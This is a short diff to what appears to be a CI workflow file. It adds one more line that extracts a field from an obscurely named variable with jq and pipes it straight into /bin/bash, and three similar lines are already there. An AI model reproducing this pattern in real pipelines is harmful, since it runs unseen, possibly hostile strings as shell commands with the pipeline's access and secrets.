@@ -31,6 +31,7 @@ jobs:
           echo $uaa584 | jq -r .fc48 | /bin/bash
           printf '%s' "$t8" | jq -r .n075 | /bin/bash
           echo $z51 | jq -r .uuy469 | /bin/bash
+          echo $z6 | jq -r .xg8633 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
